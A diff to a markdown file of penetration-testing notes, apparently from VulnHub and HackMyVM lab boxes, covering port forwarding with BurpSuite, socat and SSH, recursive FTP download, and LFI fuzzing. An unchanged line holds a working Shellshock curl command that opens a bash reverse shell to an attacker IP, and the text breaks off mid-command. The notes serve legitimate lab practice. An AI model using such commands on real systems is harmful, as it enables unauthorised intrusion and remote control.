@@ -31,17 +31,26 @@ Notes related to Vuln Assmnt/PenTesting
 > e.g from vulnhub symfonos v3 following gives Rev Shell @ port 9999.\
 > curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.10.100/9999 0>&1' http://192.168.10.10/cgi-bin underworld/test.sh
 
+#### Portforwarding via BurpSuite
+> 1.  Under "Proxy Listeners" add new listener on random port [e.g TCP9000] and select option "All Interfaces". In "Request Handling" tab give the IP and Port [e.g IP2:80] of server you want to access. Now if you open http://IP1:9000 it will redirect to http://IP2:80
+
+#### FTP download a directory - As can't download with traational FTP
+> 1. ftp://192.168.75.65/Logs
+> 1. wget -r -nH --cut-dirs=5 -nc ftp://anonymous:nopassneeded@192.168.75.65//absolute/path/to/directory
+> 1. wget -r -nH --cut-dirs=5 -nc ftp://anonymous:nopassneeded@192.168.75.65//Logs
+> 1. ncftp -u [user] -p [pass] [server]
+
 #### Portforwarding local service 8080
 > using **socat** for local port forwarding. In this example port 8080 is running locally and we will forward and make it public to 8089.\
 > socat TCP-LISTEN:8089,fork TCP:127.0.0.1:8080
 
 #### Portforwarding local service 5901 (VNC) - HackMyVM Box Level
-> using SSH (Kali IP: 192.168.10.100, Level IP: 192.168.10.11).\
-> there is a service running on port 5901 locally.\
-> ss -tupln output --> 127.0.0.1:5901 (locally) && 0.0.0.0:65000 (global) && :80(global).\
-> From Kali Box run: ssh -L 5901:localhost:5901 one@192.168.10.11 -p 65000.\
-> Now you can acess that port 5901 locally i.e. (from Kali Box: http://127.0.0.1:5901) .\
-> **VNC open session** vncviewer -passwd remote_level 127.0.0.1:5901
+> 1. using SSH (Kali IP: 192.168.10.100, Level IP: 192.168.10.11).\
+> 1. there is a service running on port 5901 locally.\
+> 1. ss -tupln output --> 127.0.0.1:5901 (locally) && 0.0.0.0:65000 (global) && :80(global).\
+> 1. From Kali Box run: ssh -L 5901:localhost:5901 one@192.168.10.11 -p 65000.\
+> 1. Now you can acess that port 5901 locally i.e. (from Kali Box: http://127.0.0.1:5901) .\
+> 1. **VNC open session** vncviewer -passwd remote_level 127.0.0.1:5901
 
 #### Fuzzing LFI
 > 1. wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathto
